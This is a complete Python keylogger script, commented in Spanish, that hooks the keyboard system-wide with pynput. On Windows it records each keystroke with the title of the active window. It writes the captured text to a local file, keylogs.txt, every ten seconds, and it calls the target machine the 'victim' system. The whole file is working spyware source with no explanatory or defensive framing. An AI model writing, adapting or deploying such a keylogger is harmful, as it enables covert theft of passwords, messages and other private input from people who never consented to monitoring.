import pynput.keyboard, threading, platform

try:
    import win32gui as w
except Exception:
    pass


log:str = ""
interval:int = 10
victim_system:str = platform.system()
lastWindow:str = "" 


def append_to_log(string) -> None:
    """
    Appends a string to the global 'log' variable.

    :param string: A string to be appended to the log.
    :type string: str
    :return: None
    """
    global log
    log = log + string
    
def process_key_press(key) -> None:
    """
    Processes key presses and logs them to a file.

    Args:
        key (pynput.keyboard.Key): The key that was pressed.

    Returns:
        None.
    """
    global lastWindow
    current_key = ""
        
    # Verifica si el sistema operativo es Windows
    if victim_system == 'Windows':
        try:
            # Obtiene el nombre de la ventana actualmente activa
            CurrentWindowName = w.GetWindowText(w.GetForegroundWindow())

            # Si el nombre de la ventana actual es diferente al nombre de la última ventana registrada
            if lastWindow != CurrentWindowName:
                # Actualiza el nombre de la última ventana registrada
                lastWindow = CurrentWindowName
                # Agrega una etiqueta a los datos registrados para indicar que se han registrado en la nueva ventana
                current_key = f"\n\n[Datos ingresados en : {CurrentWindowName}]\n"
        except Exception as e:
            pass

            
    try:
        current_key += str(key.char)
    except AttributeError:
        KEY_MAPPING = {
            key.space: " ",
            key.enter: " [ENTER] ",
            key.backspace: " [BACKSPACE] ",
            key.ctrl_l: " [CTRL] ",
            key.ctrl_r: " [CTRL] ",
            key.shift: " [SHIFT] ",
            key.shift_r: " [SHIFT] ",
            key.delete: " [DELETE] ",
            key.esc: " [ESC] ",
            key.tab: " [TAB] ",
            key.up: " [UP] ",
            key.down: " [DOWN] ",
            key.left: " [LEFT] ",
            key.right: " [RIGHT] ",
            key.cmd: " [WINDOWS-KEY] ",
            key.cmd_r: " [WINDOWS-KEY] ",
            key.f1: " [F1] ",
            key.f2: " [F2] ",
            key.f3: " [F3] ",
            key.f4: " [F4] ",
            key.f5: " [F5] ",
            key.f6: " [F6] ",
            key.f7: " [F7] ",
            key.f8: " [F8] ",
            key.f9: " [F9] ",
            key.f10: " [F10] ",
            key.f11: " [F11] ",
            key.f12: " [F12] ",
            key.alt_l: " [ALT] ",
            key.alt_r: " [ALT] ",
            key.caps_lock: " [CAPSLOCK] ",
            key.home: " [HOME] "
        }
        current_key += KEY_MAPPING.get(key, " " + str(key) + " ")

    append_to_log(current_key)    

def addLog() -> None:
    """
    Appends a log message to the 'keylogs.txt' file.

    Parameters:
    None

    Returns:
    None
    """
    with open("keylogs.txt", "a+") as f:
        f.write(log)

def report() -> None:
    """
    Runs a report function recursively using a Python thread timer. 

    :return: None
    """
    global log
    addLog()
    log = ""
    timer = threading.Timer(interval, report)
    timer.start()
   
keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()